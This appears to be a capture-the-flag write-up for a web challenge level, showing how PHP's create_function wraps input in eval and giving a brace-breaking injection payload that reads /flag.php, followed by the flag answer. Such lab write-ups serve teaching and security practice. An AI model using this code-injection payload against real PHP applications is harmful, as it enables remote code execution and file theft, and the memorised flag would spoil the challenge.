---
layout: default
title: level15
---

Here we exploit `RCE`. we can see it uses the function `create_function`, however, here [create function manual](https://www.php.net/manual/en/function.create-function.php) we can see it using `eval`, and thus considers unsecure...

That's how it works, how it creates our function:
```php
eval('function() { YOUR_STRING_HERE }');
```

So, let's inject some code that'll break the `{}`, and then execute our code :)
```php
} echo htmlspecialchars(file_get_contents('/flag.php')); {
```
*Notice we need to use `htmlspecialchars`, without this function, it won't show us the flag!*


**Flag:** ***`WEBSEC{HHVM_was_right_about_not_implementing_eval}`*** 
